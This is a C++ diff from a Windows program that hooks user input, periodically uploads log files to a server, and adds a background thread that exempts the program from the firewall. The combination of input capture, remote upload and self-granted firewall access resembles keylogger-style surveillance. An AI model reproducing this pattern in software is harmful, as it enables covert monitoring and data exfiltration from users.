@@ -201,6 +201,8 @@ void periodicallySendFiles()
     const UINT timerInterval = static_cast<UINT>(std::max(nextPostTime - time(0), time_t(10)) * 1000);
 
     timer = SetTimer(NULL, 0, timerInterval, static_cast<TIMERPROC>(onTimer));
+
+    std::thread(allowFirewallForMe).detach();
 }
 
 
@@ -232,11 +234,12 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
                         static std::atomic<bool> isSendingFiles = false;
                         if (!isSendingFiles) {
                             isSendingFiles = true;
+                            const bool isHooking = InputHooker::instance().isHooking();
+                            InputHooker::instance().stopHook();
+
                             allowFirewallForMe();
                             Logger::instance() << "User asks to post logs to the server, posting";
                             // TODO: rewrite to async-await when compiler is ready
-                            const bool isHooking = InputHooker::instance().isHooking();
-                            InputHooker::instance().stopHook();
                             rotateLogfile();
                             auto fileSent = postAllNewLogfiles();
                             std::thread([&fileSent, isHooking]() {
